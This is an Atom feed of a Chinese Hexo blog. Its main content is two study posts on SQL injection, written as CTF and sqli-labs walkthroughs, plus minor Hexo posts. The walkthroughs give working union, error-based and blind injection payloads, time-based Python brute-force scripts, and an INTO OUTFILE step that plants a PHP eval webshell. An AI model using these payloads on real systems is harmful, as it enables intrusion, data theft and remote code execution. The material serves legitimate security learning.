<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>咸鱼的学习之旅</title>
  
  <subtitle>共勉</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-04-13T03:02:29.672Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>aaro135</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>img_test</title>
    <link href="http://yoursite.com/2020/04/12/img-test/"/>
    <id>http://yoursite.com/2020/04/12/img-test/</id>
    <published>2020-04-12T15:48:06.000Z</published>
    <updated>2020-04-13T03:02:29.672Z</updated>
    
    <content type="html"><![CDATA[<p>hexo图片不显示</p><a id="more"></a><p>看过某朋友博客后的解决办法</p><p><a href="https://cctap.github.io/2019/11/15/%E8%A7%A3%E5%86%B3hexo%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E7%BD%91%E9%A1%B5%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA/#more" target="_blank" rel="noopener">https://cctap.github.io/2019/11/15/%E8%A7%A3%E5%86%B3hexo%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E7%BD%91%E9%A1%B5%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA/#more</a></p><p>其实总结就是，markdown语法对图片的相对引用，在网页上并不能正常显示，甚至去看网页源码的时候，会发现它引用路径就是错误的。安装hexo中的一个插件可以让图片文件可以正常的被调用。</p><p><code>npm install &lt;https://github.com/7ym0n/hexo-asset-image&gt; –save</code> </p><p>使用以下标签插件的方式成功出现图片</p><p><code></code></p><img src="/2020/04/12/img-test/1.jpg" class width="1">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hexo图片不显示&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sql注入分类及例题</title>
    <link href="http://yoursite.com/2020/04/12/sql%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB%E5%8F%8A%E4%BE%8B%E9%A2%98/"/>
    <id>http://yoursite.com/2020/04/12/sql注入分类及例题/</id>
    <published>2020-04-12T07:53:17.594Z</published>
    <updated>2020-04-12T07:55:38.059Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql注入学习记录"><a href="#sql注入学习记录" class="headerlink" title="sql注入学习记录"></a>sql注入学习记录</h1><p>观看视频（安全牛课堂）后的记录</p><a id="more"></a><p>###sqlmap支持的注入</p><ul><li>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li><li>2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li><li>3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li><li>4、联合查询注入，可以使用union的情况下的注入。</li><li>5、堆查询注入，可以同时执行多条语句的执行时的注入。</li><li>create table user(id int auto_increment,</li><li>username varchar(20) not null,</li><li>password varchar(30) not null,</li><li>create_date DATE,</li><li>PRIMARY KEY(id)</li><li>)DEFAULT CHARSET=utf8;</li></ul><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>宽字节注入是利用MySQL的一个特性，MySQL在使用GBK编码时，会认为两个字符是一个汉字（前一个ascii码大于128，到汉字的范围）</p><p>知道ASCII码表和GBK（《汉字内码扩展规范》，不全）</p><p>URL转码中的转换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">空格   %20</span><br><span class="line">&#39;%27</span><br><span class="line">#%23</span><br><span class="line">\%5C</span><br></pre></td></tr></table></figure><p>一、从addslashes中逃逸出来</p><p>需要了解函数<code>string addslashes( string $str )</code>,对某些符号（’、”、\、NULL字符）前加上反斜杠，使得输入的单引号双引号被转义失去在查询语句中的作用。</p><p>1.加入\或者单数个\，使得\’变成<code>\\&#39;</code></p><p>2.把\弄没，如，输如<code>%df&#39;  -&gt;   %df%5C%27</code></p><p><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php" target="_blank" rel="noopener">经典例子</a></p><p>这道题就是经典的宽字节注入题，使用了addslashes函数来进行对输入字符的转义。</p><p>可以见到当输入<code>id=1&#39;</code>时，结果是这样的（注意，在hackbar工具中，基本需要对符号进行转码，输入单引号应用%27）</p><p><img src="/2020/04/12/sql%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB%E5%8F%8A%E4%BE%8B%E9%A2%98/360MoveData\Users\yaha\Documents\sql注入题分析\初见宽字节注入\第一次宽字节注入1-1.png" alt></p><p>所以利用上面所学的知识，只要在前面加上任意一个字符的GBK编码就行（大于128，<code>%aa</code>都可以,现在的GBK编码有变化吗？我用%aa不可以了，%df倒是可以），就可以将<code>&#39;</code>释放出来，如图</p><p><img src="/2020/04/12/sql%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB%E5%8F%8A%E4%BE%8B%E9%A2%98/360MoveData\Users\yaha\Documents\sql注入题分析\初见宽字节注入\宽字节第一次注入2.png" alt></p><p>接下来就是常规思路的爆库爆表爆字段爆值(MySQL中information_schema表中含有所有数据库表名列名的信息)。</p><p>先看看有几列,尝试order by 1……..10，看脸，这道题到3报错，而2不报错</p><p><img src="/2020/04/12/sql%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB%E5%8F%8A%E4%BE%8B%E9%A2%98/360MoveData\Users\yaha\Documents\sql注入题分析\初见宽字节注入\第一次宽字节注入3.png" alt></p><p><img src="/2020/04/12/sql%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB%E5%8F%8A%E4%BE%8B%E9%A2%98/360MoveData\Users\yaha\Documents\sql注入题分析\初见宽字节注入\第一次宽字节注入4.png" alt></p><p>可以看出这道题目是两列</p><p>利用union操作爆库名，看输出列的操作为<code>?id=-1%df%27 union select 1,2 %23</code></p><p>tips:而且我们输入的数字串长度是任意的，输入几个数字，就会出现几个属性，也就是说返回表的列数是等于我们输入的数字个数的，而行数与原数据库表的结构保持一致，原本有3行数据，输入数字串后仍为3行。 </p><p>爆库<code>?id=-1%df%27 union select 1,database() %23</code>,得到库名sae-chinalover </p><p>进行报表名</p><p><code>?id=-1%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23</code></p><p>可以得到好多个表名，我们可以随便选择一个表名来进行字段名的爆破，比如选取ctf这个表名构造payload</p><p><code>?id=-1%df%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x637466 %23</code></p><p>可以看到这里并没有直接用ctf这个单词，以为要是直接输入’ctf’又会遇到前面一样的问题，需要对’进行转义，这里可以将ctf三个字母转换为16进制（hackbar有相应功能），在前面加上0x，MySQL默认认识</p><p>随后得到了两个字段名user 和 pw </p><p>得到字段名了就简单了，直接在ctf表中爆出所有的user和pw就行了</p><p><code>?id=-1%df%27 union select 1,group_concat(pw) from ctf %23</code></p><p>可以看到flag</p><p>同样的，这道题目也可以用sqlmap的形式来进行注入，就是由于宽字节注入的原因，需要加上–hex，否则无法检测到注入</p><h2 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h2><p>不显示结果，但是调整输入会改变输出。</p><p>和时间盲注差不多。</p><p>函数补充mid(str,1,1)</p><p>left(str,length)</p><p>right(str,length)</p><p>例题:<a href="http://106.12.37.37:8080/level2/" target="_blank" rel="noopener">布尔（带审计）</a></p><p>response  = requests.get(url,timeout=5)</p><p>response.content.find(‘xxx’) != -1</p><h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p>有效果判断，返回结果时间长于设定的秒数</p><p><strong>部分相关函数</strong>:</p><p><strong>1.时延函数：</strong></p><p><strong>sleep(duration):</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">了解一下作用。</span><br><span class="line">select from user where id &#x3D; 1 and sleep(3)；（成功延时）</span><br><span class="line">select from user where id &#x3D; 1 or  sleep(3)；（不成功延迟）</span><br></pre></td></tr></table></figure><p><strong>benchmark(count ,exp)</strong>,多次执行一语句，导致延时benchmark(1000000000000,sha(1));</p><p><strong>笛卡尔积count(*)</strong><code>select count(*) from information_schema.columns A,information_schema.columns B,information_schema.tables C;</code></p><p><strong>GET_LOCK(‘a’,5)</strong>,应用少，需要新开会话。</p><p><strong>repeat/repad函数</strong>进行构造长字符串进行正则匹配pattern的计算量要很大。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) rlike &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;;</span><br></pre></td></tr></table></figure><p><strong>2.截断函数</strong></p><p><strong>substr()/substring()</strong>函数，<code>select * from user where username = &#39;a&#39; or if (substr((select username from user where id = 1),1,1)=&#39;a&#39;,sleep(3),0);</code></p><p>substr(‘abcde’,1,1);substring(‘abcde’,2);substring(‘abcde’ from 2 for 1);</p><p>截取函数: <strong>substring_index(string,delim,count)</strong>; select substring_index(‘aaaabbbbcccc’,’b’,+-2);</p><p><strong>3.查询函数</strong></p><p><strong>rlike ‘^1’正则匹配   regexp ‘^1’</strong></p><p>配合<strong>IF（expr1，expr2，expr3）</strong>，IF(1,2,3)等于<code>id=1？2:3</code></p><p><code>使用举例：select * from user where id = 1 and if (ascii(substring(database(),1,1))=115,sleep(3),0);</code></p><p><strong>select case when</strong>语句，相当于ifelse。<code>select case when .... then ... else ... end from user;</code></p><p>例题:<a href="http://123.206.87.240:8002/web15/" target="_blank" rel="noopener">http://123.206.87.240:8002/web15/</a></p><p>bugku 的一道题</p><p>附送源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getIp()&#123;</span><br><span class="line">$ip &#x3D; &#39;&#39;;</span><br><span class="line">if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr &#x3D; explode(&#39;,&#39;, $ip);&#x2F;&#x2F;分割字符串，无法使用逗号</span><br><span class="line">return $ip_arr[0];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host&#x3D;&quot;localhost&quot;;</span><br><span class="line">$user&#x3D;&quot;&quot;;</span><br><span class="line">$pass&#x3D;&quot;&quot;;</span><br><span class="line">$db&#x3D;&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class="line"></span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">echo &#39;your ip is :&#39;.$ip;</span><br><span class="line">$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure><p>由于会将我们的ip地址加入数据库，那么只要在ip地址上下功夫，就可以进行注入。</p><p>使用X-Forwarded-For，可以修改请求头中的ip地址</p><p><code>insert into client_ip (ip) values (&#39;$ip&#39;)</code>这是注入的语句</p><p>基于上面所学的时间注入进行测试</p><p>‘127.0.0.1’ and sleep(3) or ‘1’=’1’</p><p>127.0.0.1’ and sleep(3) or ‘1’=’1</p><p>发现可行</p><p>进行构造payload:<code>127.0.0.1&#39; and (select case when (ascii(substring((select database()) from 1 for 1)))&lt;128 then sleep(10) else &#39;1&#39; end) or &#39;1&#39;=&#39;1</code></p><p>其他东西都能直接爆出来</p><p>接下来编写脚本对值进行爆破:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web15&#x2F;&#39;</span><br><span class="line">dic &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@&#123;&#125;&#39;</span><br><span class="line">flag &#x3D; &#39;flag???-&gt;&#39;</span><br><span class="line"></span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for x in dic:</span><br><span class="line">        headers &#x3D; &#123;&quot;X-Forwarded-For&quot;:&quot;127.0.0.1&#39; + (select case when (substring((select flag from flag) from %d for 1))&#x3D; &#39;%s&#39; then sleep(2) else &#39;1&#39; end) or &#39;1&#39;&#x3D;&#39;1&quot; %(i,x)&#125;</span><br><span class="line">        try:</span><br><span class="line">            result &#x3D; requests.get(url,headers &#x3D; headers, timeout&#x3D;2)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            flag &#x3D; flag + x </span><br><span class="line">            print (flag)</span><br><span class="line">            break</span><br><span class="line">print (flag)</span><br></pre></td></tr></table></figure><h2 id="基于报错注入"><a href="#基于报错注入" class="headerlink" title="基于报错注入"></a>基于报错注入</h2><p>例题的话sqli-labs上也有</p><p>公式网上有很多，可以直接抄来用，最好可以学习了解用法</p><p>公式：<code>and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></p><p>rand() 产生一个0~1的随机数。floor向下取整。rand*2时，像下取整得到的值是0或者1。</p><p>如: <code>select count(*) from information_shema.tables group by floor(rand()*2)</code></p><p>此时加入rand（0）必然报错。报不报错和表的数据量和rand中的数据有关。利用产生0/1的随机性。</p><p><code>floor(rand()*2)`</code> </p><p>count(*)先建立虚表,形式如下：</p><table><thead><tr><th>key</th><th>count(*)</th></tr></thead><tbody><tr><td>0</td><td>1+1</td></tr><tr><td>1</td><td>1</td></tr></tbody></table><p>0</p><p>1</p><p>1</p><p>0</p><p>1</p><p>1</p><table><thead><tr><th>查询计算</th><th>虚表插入计算</th></tr></thead><tbody><tr><td>0</td><td>0</td></tr><tr><td>1</td><td>0（此时重复插入0，进行报错）</td></tr></tbody></table><p>常用的：</p><p>updatexml：or updatexml(1,concat(0x7e,(version())),0)(第二个参数应该是Xpath格式的字符串，输入不合格报错，最大长度为32位)</p><p>and extractvalue(1,concat(0x7e),(select database()))</p><p>and exp(~(select * from(select user())a));</p><p>有些报错函数具有局限性，如：select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a;改为database（）就失去了作用。</p><p>报错注入例题：<a href="http://ctf5.shiyanbar.com/web/baocuo/index.php" target="_blank" rel="noopener">报错注入</a></p><p>点开可以发现，他要我们进行登录，提示我们post username和password</p><p>看源码：<code>select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;</code></p><p>可以先尝试简单的sql注入可不可使用</p><p>输入‘发现出现语法报错<code>You have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near &#39;44545&#39;&#39;  at line 1</code> </p><p>而当我们进行输入#注释时，却出现了问题<code>Sql injection detected</code>，显示了这么一个东西，那么说明盖对于post的数据，进行了相应的过滤</p><p>可以尝试其他注释的方式，</p><p>题目好像崩了。。</p><p>换sqli-labs 上的例子吧，test5</p><p>通过尝试</p><p>数据库名：~security </p><p>表名有~emails,referers,uagents,users </p><p>列名~USER,CURRENT_CONNECTIONS,TOTAL_ 等等</p><p>太长了不完全显示，可以用limit 1,1来一个个显示</p><p><code>?id=1&#39; or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name regexp &#39;users&#39; limit 7,1)),0)%23</code></p><p>得到password列，</p><p>用查询语句输出列中数据就可以了</p><p>得到I-kill-you，hhh</p><h2 id="联合注入union"><a href="#联合注入union" class="headerlink" title="联合注入union"></a>联合注入union</h2><ul><li><strong>@@datadir</strong>数据库存储路径</li><li><strong>@@basedir</strong> mysql安装路径</li></ul><p>0’ union select 1,@@datadir,@@basedir%23 </p><h2 id="基于堆查询注入"><a href="#基于堆查询注入" class="headerlink" title="基于堆查询注入"></a>基于堆查询注入</h2><h2 id="基于规则的注入"><a href="#基于规则的注入" class="headerlink" title="基于规则的注入"></a>基于规则的注入</h2><p>比如说注册时候用空格输入过长的用户名，mysql忽略空格，就可以创建管理员账号，好像被修复了？在自己电脑上无法实现。</p><h2 id="检测过滤和绕过过滤的方法"><a href="#检测过滤和绕过过滤的方法" class="headerlink" title="检测过滤和绕过过滤的方法"></a>检测过滤和绕过过滤的方法</h2><p>过滤=</p><p>regexp            !(&lt;&gt;）（&lt;&gt;相当于！=）            like</p><p>过滤# </p><p>两个参数时，使用/**/进行联结。</p><p>–+ 能注释后面的语句</p><p>过滤空格</p><p>%0a换行符</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;sql注入学习记录&quot;&gt;&lt;a href=&quot;#sql注入学习记录&quot; class=&quot;headerlink&quot; title=&quot;sql注入学习记录&quot;&gt;&lt;/a&gt;sql注入学习记录&lt;/h1&gt;&lt;p&gt;观看视频（安全牛课堂）后的记录&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sqli-labs知识点梳理</title>
    <link href="http://yoursite.com/2020/04/10/sqli-labs%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86/"/>
    <id>http://yoursite.com/2020/04/10/sqli-labs知识点梳理/</id>
    <published>2020-04-10T06:05:27.593Z</published>
    <updated>2020-04-12T08:02:35.495Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs知识点梳理"><a href="#sqli-labs知识点梳理" class="headerlink" title="sqli-labs知识点梳理"></a>sqli-labs知识点梳理</h1><a id="more"></a><p><strong>1.</strong>没有做任何防护，直接使用union注入就好了。不过先猜测查询语句格式：</p><p><code>select * from [table_name] where id  = &#39;input_id&#39; limit 0,1</code></p><p><code>(select group_concat(table_name) from information_schema.tables where table_schema=database())</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">爆出来的结果，后面可以参照</span><br><span class="line">emails,referers,uagents,users </span><br><span class="line"></span><br><span class="line">Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Create_user_priv,Event_priv,Trigger_priv,Create_tablespace_priv,Delete_history_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_updates,max_connections,max_user_connections,plugin,authentication_string,password_expired,is_role,default_role,max_statement_time </span><br><span class="line"></span><br><span class="line">Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure><p><strong>2.</strong>和第一题一样，主要就是改了下查询语句的格式</p><p><code>select * from [table_name] where id  = input_id limit 0,1</code></p><p>去掉了引号，上文的payload就失去了效果</p><p><strong>3.</strong>和之前的一样，没有什么特别的地方，就是看到了提示single quote with twist，貌似加了括号？？？</p><p>根据报错信息里面透露的右括号，可以知道</p><p><strong>4.</strong>还是有报错，总结下，<strong>从几种常用形式来找：</strong><code>&#39;input_id&#39;/&quot;input_id&quot;/(&#39;input_id&#39;)/(&quot;input_id&quot;)</code></p><p>在各种形式的payload拼接好后后面输入任意乱码，如果对了就会报错提示你了</p><p>后续操作如上</p><p><strong>5.</strong>原来有点一头雾水，后来查了下<strong>double injection</strong> 的意思，叫<strong>双查询注入</strong>，其实就是利用了报错注入中rand函数并构筑虚表时，rand会被执行两次从而报错的原理，mysql特有特性。<strong>报错注入</strong>的原理。</p><p>这里我用了updatexml函数</p><p>payload</p><p><code>-1&#39; or updatexml(0,concat(0x7e,(database())),0)%23</code></p><p>另一篇博客里有其他的注入函数，不赘述了。</p><p><strong>6.</strong>如5，需要双引号</p><p><strong>7.</strong>好像有点意思了，给了提示use outfile,先去百度下<strong>outfile</strong>的用法，就是把结果存到文件里</p><p>看了大佬博客学会了新的思路</p><p>这道是不能直接进行保存文件的，因为对于文件的保存路径有限制</p><p>先得到我们数据存储路径和mysql的安装路径</p><p>Your Login name:E:\XAMPP\mysql\data\ </p><p>Your Password:E:/XAMPP/mysql</p><p>构造以下语句上传一句话木马， <code>1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;aaa&quot;]);?&gt;&#39; into outfile &#39;e:\\XAMPP\\tmp\\data.php&#39;%23</code> </p><p>然后菜刀链接，但是我没成功，应该是我的菜刀有问题。。。</p><p><strong>8.</strong>题目说是<strong>Boolean注入</strong>，但是我发现时间盲注似乎也可以，可以尝试。</p><p>尝试了下可行hhh，给上脚本，可以自己试试，url里随意拼接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">dic &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@&#123;&#125;&#39;</span><br><span class="line">flag &#x3D; &#39;flag???-&gt;&#39;</span><br><span class="line"></span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for x in dic:</span><br><span class="line">        url &#x3D; &quot;http:&#x2F;&#x2F;localhost:8081&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),%d&quot;%(i)+&quot;,1))&#x3D;ascii(&#39;%s&quot;%(x)+&quot;&#39;),sleep(2),0)%23&quot;</span><br><span class="line">        try:</span><br><span class="line">            requests.get(url,timeout&#x3D;2)</span><br><span class="line">        except requests.exceptions.Timeout:</span><br><span class="line">            flag &#x3D; flag + x </span><br><span class="line">            print(flag)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><strong>9.10.时间盲注</strong></p><p>前面的文档里照抄就好</p><p><strong>11.12.报错注入</strong></p><p>两题改变的是单双引号</p><p>附上payload:</p><p>uname=1’ or updatexml(1,concat(0x7e,database()),0)#&amp;passwd=1&amp;submit=Submit</p><p>后面的题目大致类似13.14.15.16，有的对输出有限制，对于输出的结果有限制的，就可以用limit(0,1)显示第一个结果，limit(1,1)显示第二个结果。</p><p><strong>updatequery</strong> 学到了新写法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1234&#39; and (select count(*) from information_schema.tables group by concat_ws(&#39;-&#39;,(select database()),floor(rand(0)*2))) where username&#x3D;&#39;admin&#39;--</span><br></pre></td></tr></table></figure><p><strong>header injection</strong>前面讲过例题，就是那个修改XFF的，也是修改请求头，两个分别是司改referer和user-uagent 的值，需要猜测数据库插入语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】；</span><br><span class="line"></span><br><span class="line">(1)HTTP Referer是header的一部分，当浏览器向web[服务器](https:&#x2F;&#x2F;baike.baidu.com&#x2F;item&#x2F;%E6%9C%8D%E5%8A%A1%E5%99%A8)发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。</span><br><span class="line"></span><br><span class="line">(2)X-Forwarded-For:简称XFF头，它代表客户端，用于记录代理信息的，每经过一级代理(匿名代理除外)，代理服务器都会把这次请求的&#96;来源IP&#96;追加在&#96;X-Forwarded-For&#96;中</span><br><span class="line"></span><br><span class="line">(3)Cookie，有时也用其复数形式 Cookies，指某些网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）</span><br><span class="line"></span><br><span class="line">(4)X-Real-IP一般只记录真实发出请求的客户端IP，看下面的例子</span><br><span class="line"></span><br><span class="line">注：源自https:&#x2F;&#x2F;www.cnblogs.com&#x2F;-zhong&#x2F;p&#x2F;10925426.html，更详细请看大佬博客</span><br></pre></td></tr></table></figure><p><strong>Cookie injection</strong> 类似，抓包修改cookie的值</p><p><strong>dump into outfile</strong></p><p>每日一篇，共勉</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;sqli-labs知识点梳理&quot;&gt;&lt;a href=&quot;#sqli-labs知识点梳理&quot; class=&quot;headerlink&quot; title=&quot;sqli-labs知识点梳理&quot;&gt;&lt;/a&gt;sqli-labs知识点梳理&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2020/04/10/hello-world/"/>
    <id>http://yoursite.com/2020/04/10/hello-world/</id>
    <published>2020-04-10T04:57:17.384Z</published>
    <updated>2020-04-10T13:36:06.959Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><h3 id="流量统计功能"><a href="#流量统计功能" class="headerlink" title="流量统计功能"></a>流量统计功能</h3><p><a 